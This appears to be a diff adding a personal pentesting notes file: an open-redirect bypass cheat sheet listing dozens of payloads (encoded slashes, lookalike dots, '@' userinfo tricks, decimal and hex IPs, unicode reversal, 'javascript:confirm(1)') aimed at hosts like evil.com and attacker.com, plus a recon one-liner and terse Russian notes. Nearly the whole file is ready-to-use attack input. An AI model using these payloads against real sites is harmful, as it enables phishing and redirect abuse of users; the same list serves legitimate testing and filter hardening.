@@ -1,0 +1,68 @@
+open redir baypass ---- cheetshit https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html
+
+
+
+    https:www.google.com
+    HtTp://google.com
+    http\x3A\x2F\x2Fgoogle.com
+    //google。com
+    x00http://google.com
+    ////216.58.214.206
+    /\216.58.214.206
+    x20http://www.google.com
+    https://www.google.com
+    hthttp://tp://www.google.com
+    。/www.google.com
+    /path?redirect=//2130706433
+or
+/path?redirect=//0x7f000001
+//#//google.com/
+//www.google.com/%2f%2e%2e
+//www.google.com/%2e%2e
+//;@google
+.com
+//%09/google.com
+//%http://5cgoogle.com
+//google.com/..;/css
+//\http://google.com
+//%EF%B9%B0/https://google.com
+
+Chinese dot (%E3%80%82)
+
+ 。
+ http:http:evil[.]com
+ http:/evil%252ecom
+ ///www.x.com@evil.com
+
+ /%2F/xhzeem.me
+%252F@xhzeem.me
+//xhzeem.me\@.website.com
+//xhzeem.me\\@.website.com
+//xhzeem.me%FF@website.com
+//xhzeem.me%23@website.com
+//website.com/../..%20.xhzeem.me
+
+
+
+2. добавить турецкую  ğ http://vl.vomğ.target.com долэно превратиться в ? буква ..... еще \udfff
+3.Cat lol.txt | gf redirect | anti-burl | tee scan.txt
+4. parametr pollution
+5.когда вставляю пейлоад в location header добавлять /? в конце ----location://attacer.com/&-foobar
+6.
+
+
+    Test for basic modification of the url like target.com/?redirect_url=https://attacker.com.
+    Try with double forward slashes target.com//attacker.com.
+    Try target.com/@attacker.com. In this case the interpretation will be like, the target.com is the username and attacker.com will be the domain.
+    Test for javascript Protocol javascript:confirm(1).
+    Try target.com/?image_url=attacker.com/.jpg if there’s an image resource being loaded.
+    Try IP address instead of the domain name.
+    You can go further in terms of representing the IP in decimal, hex or octal.
+    You can also try target.com/?redirect_url=target.com.attacker.com to bypass weak regex implementations.
+    Chinese seperator 。 as the dot - https://attacker%E3%80%82com.
+    Test for String reverser unicode(“\u202e”) target.com@%E2%80%AE@attacker.com.
+    No slashes https:attacker.com.
+    Back slashes http:/\/\attacker.com or https:/\attacker.com.
+    Different domain redirect_url=.jp resulting in redirection of target.com.jp which is not the same as target.com.
+    Try some unicode(including emojis) madness t𝐀rget.com or 𝐀ttacker.com(‘𝐀’ is “\uD835\uDC00”).
+    There are a lot more, please refer the Cool Finds & Cheat Sheets section of this article. If you want more tricks, DISCOVER EM!
